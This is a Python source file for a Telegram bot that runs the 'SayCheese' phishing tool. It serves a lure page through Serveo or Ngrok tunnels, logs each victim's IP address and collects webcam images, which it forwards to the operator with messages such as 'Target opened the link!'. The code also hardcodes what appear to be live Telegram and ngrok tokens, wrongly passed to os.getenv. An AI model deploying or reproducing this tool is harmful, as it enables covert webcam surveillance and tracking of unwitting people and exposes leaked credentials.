import os
import subprocess
import time
import random
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, filters, MessageHandler
from flask import Flask, request, send_file
from telegram.error import InvalidToken
import threading

# Configuración del bot
TOKEN = os.getenv("8086330645:AAHgxBvknFaGAuuNhcV2jch-ka0anFbzj3M")
ADMIN_CHAT_ID = os.getenv("7389519750")
WEBHOOK_URL = os.getenv("https://grabcam.onrender.com")

# Validar variables de entorno
if not TOKEN:
    raise ValueError("TOKEN no está configurado en las variables de entorno.")
if not ADMIN_CHAT_ID:
    raise ValueError("ADMIN_CHAT_ID no está configurado en las variables de entorno.")
if not WEBHOOK_URL:
    raise ValueError("WEBHOOK_URL no está configurado en las variables de entorno.")

# Crear la aplicación Flask para el webhook
app = Flask(__name__)

# Crear una segunda aplicación Flask para el servidor de phishing
phishing_app = Flask(__name__)

# Rutas para el servidor de phishing
@phishing_app.route('/')
def serve_index():
    print("Sirviendo index2.html")  # Log para depurar
    return send_file("index2.html")

@phishing_app.route('/ip', methods=['GET'])
def log_ip():
    ip = request.remote_addr
    print(f"Capturando IP: {ip}")  # Log para depurar
    with open("ip.txt", "a") as f:
        f.write(f"IP: {ip}\n")
    return "OK", 200

@phishing_app.route('/post', methods=['POST'])
def save_image():
    print("Recibiendo solicitud POST para guardar imagen")  # Log para depurar
    if 'image' in request.files:
        image = request.files['image']
        print("Guardando imagen en Log.log")  # Log para depurar
        image.save("Log.log")
    else:
        print("No se recibió ninguna imagen en la solicitud")  # Log para depurar
    return "OK", 200

# Iniciar el servidor de phishing en un hilo separado
def run_phishing_server():
    print("Iniciando servidor de phishing en puerto 3333")  # Log para depurar
    phishing_app.run(host='0.0.0.0', port=3333)

# Banner (simulado)
def banner():
    return (
        "SayCheese v1.1\n"
        "Original by github.com/thelinuxchoice/saycheese\n"
        "Reborn by Noob Hackers\n"
        "Note: Please ensure you have an active internet connection to get a link!"
    )

# Verificar dependencias (solo Ngrok)
def check_dependencies():
    ngrok_path = "/usr/local/bin/ngrok"  # Ngrok instalado por el Dockerfile
    if not os.path.exists(ngrok_path):
        return f"Error: Ngrok not found at {ngrok_path}. Please ensure it is installed."
    return None

# Detener procesos
def stop_processes():
    for proc in ["ngrok"]:
        subprocess.run(["pkill", "-f", proc], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Capturar IP
def catch_ip():
    if os.path.exists("ip.txt"):
        with open("ip.txt", "r") as f:
            ip = re.search(r"IP:\s*(\S+)", f.read())
            if ip:
                with open("saved.ip.txt", "a") as saved:
                    saved.write(f"{ip.group(1)}\n")
                return ip.group(1)
    return None

# Iniciar servidor con Serveo
def start_serveo(subdomain=None):
    stop_processes()
    port = 3333
    if subdomain:
        cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R {subdomain}:80:localhost:{port} serveo.net"
    else:
        cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{port} serveo.net"
    
    with open("sendlink", "w") as f:
        subprocess.Popen(cmd, shell=True, stdout=f, stderr=subprocess.PIPE)
    time.sleep(8)
    
    # Iniciar el servidor Flask en un hilo separado
    phishing_thread = threading.Thread(target=run_phishing_server)
    phishing_thread.start()
    time.sleep(3)
    
    with open("sendlink", "r") as f:
        link = re.search(r"https://[0-9a-z]*\.serveo.net", f.read())
        return link.group(0) if link else None

# Iniciar servidor con Ngrok
def start_ngrok():
    stop_processes()
    port = 3333
    # Iniciar el servidor Flask en un hilo separado
    phishing_thread = threading.Thread(target=run_phishing_server)
    phishing_thread.start()
    time.sleep(2)
    # Usar Ngrok desde /usr/local/bin/ngrok
    ngrok_authtoken = os.getenv("2uiKe4Z9si8iz5isK2ixTU6OIV1_6ZafaubyQxYjEfeFW69b3")
    if ngrok_authtoken:
        print(f"Autenticando Ngrok con token: {ngrok_authtoken[:5]}...")  # Log para depurar
        subprocess.run(["/usr/local/bin/ngrok", "authtoken", ngrok_authtoken], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("Iniciando Ngrok...")  # Log para depurar
    subprocess.Popen(["/usr/local/bin/ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(15)  # Aumentamos el tiempo para asegurar que el túnel se cree
    
    try:
        link = subprocess.check_output("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9A-Za-z.-]*\.ngrok.io'", shell=True).decode().strip()
        print(f"Enlace de Ngrok generado: {link}")  # Log para depurar
        return link
    except subprocess.CalledProcessError as e:
        print(f"Error al obtener el enlace de Ngrok: {e}")  # Log para depurar
        return None

# Generar payload
def generate_payload(link):
    print(f"Generando payload con enlace: {link}")  # Log para depurar
    for src, dst in [("grabcam.html", "index2.html")]:
        with open(src, "r") as f:
            content = f.read().replace("forwarding_link", link)
        with open(dst, "w") as f:
            f.write(content)

# Verificar resultados
async def check_results(context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists("ip.txt"):
        ip = catch_ip()
        if ip:
            print(f"Enviando IP al chat: {ip}")  # Log para depurar
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Target opened the link!\nIP: {ip}")
            os.remove("ip.txt")
    
    if os.path.exists("Log.log"):
        print("Enviando imagen al chat")  # Log para depurar
        with open("Log.log", "rb") as f:
            await context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=f, caption="Cam file received!")
        os.remove("Log.log")

# Comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Recibido comando /start de chat_id: {update.message.chat_id}")  # Log para depurar
    if str(update.message.chat_id) != ADMIN_CHAT_ID:
        print(f"Chat_id no autorizado: {update.message.chat_id}, esperado: {ADMIN_CHAT_ID}")  # Log para depurar
        await update.message.reply_text("No tienes permiso para usar este bot.")
        return
    
    dep_error = check_dependencies()
    if dep_error:
        print(f"Error de dependencias: {dep_error}")  # Log para depurar
        await update.message.reply_text(dep_error)
        return
    
    await update.message.reply_text(banner())
    await update.message.reply_text("Choose a port forwarding option:\n1. Serveo.net\n2. Ngrok\nReply with 1 or 2.")
    context.user_data["waiting_for_option"] = True

# Manejar respuesta del usuario
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Recibido mensaje: {update.message.text} de chat_id: {update.message.chat_id}")  # Log para depurar
    if str(update.message.chat_id) != ADMIN_CHAT_ID or not context.user_data.get("waiting_for_option"):
        print("Mensaje ignorado: chat_id no autorizado o no esperando opción")  # Log para depurar
        return
    
    option = update.message.text.strip()
    context.user_data["waiting_for_option"] = False
    
    if option == "1":
        subdomain = f"grabcam{random.randint(1000, 9999)}"
        await update.message.reply_text(f"Using Serveo with subdomain: {subdomain}")
        link = start_serveo(subdomain)
        if link:
            generate_payload(link)
            await update.message.reply_text(f"Direct link: {link}\nWaiting for targets...")
        else:
            await update.message.reply_text("Failed to start Serveo.")
    
    elif option == "2":
        await update.message.reply_text("Using Ngrok...")
        link = start_ngrok()
        if link:
            generate_payload(link)
            await update.message.reply_text(f"Direct link: {link}\nWaiting for targets...")
        else:
            await update.message.reply_text("Failed to start Ngrok.")
    
    else:
        await update.message.reply_text("Invalid option! Please reply with 1 or 2.")
        context.user_data["waiting_for_option"] = True

# Comando /stop
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Recibido comando /stop de chat_id: {update.message.chat_id}")  # Log para depurar
    if str(update.message.chat_id) != ADMIN_CHAT_ID:
        print(f"Chat_id no autorizado: {update.message.chat_id}, esperado: {ADMIN_CHAT_ID}")  # Log para depurar
        await update.message.reply_text("No tienes permiso para usar este bot.")
        return
    
    stop_processes()
    await update.message.reply_text("Server stopped.")

# Configurar la aplicación de Telegram
try:
    application = Application.builder().token(TOKEN).build()
except InvalidToken as e:
    print(f"Error: Token de Telegram inválido: {e}")  # Log para depurar
    raise ValueError("El token de Telegram es inválido. Verifica el valor de TOKEN.")

application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("stop", stop))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

# Ruta para el webhook
@app.route('/webhook', methods=['POST'])
def webhook():
    print("Recibida solicitud en /webhook")  # Log para depurar
    update = Update.de_json(request.get_json(force=True), application.bot)
    application.process_update(update)
    return 'OK', 200

# Iniciar el servidor Flask y el JobQueue en un hilo separado
def run_flask():
    print("Iniciando servidor Flask en puerto 8080")  # Log para depurar
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 8080)))

def main():
    try:
        print(f"JobQueue disponible: {application.job_queue is not None}")
        if application.job_queue is None:
            raise ValueError("JobQueue no está disponible. Verifica que python-telegram-bot[job-queue] esté instalado.")
        
        # Configurar el webhook
        print(f"Configurando webhook en: {WEBHOOK_URL}")  # Log para depurar
        application.bot.set_webhook(url=WEBHOOK_URL)
        print(f"Webhook configurado en: {WEBHOOK_URL}")
        
        # Iniciar el JobQueue para check_results
        application.job_queue.run_repeating(check_results, interval=5)
        
        # Iniciar Flask en un hilo separado
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.start()
        
        # Mantener el hilo principal vivo
        flask_thread.join()
    except Exception as e:
        print(f"Error running bot: {e}")

if __name__ == "__main__":
    main()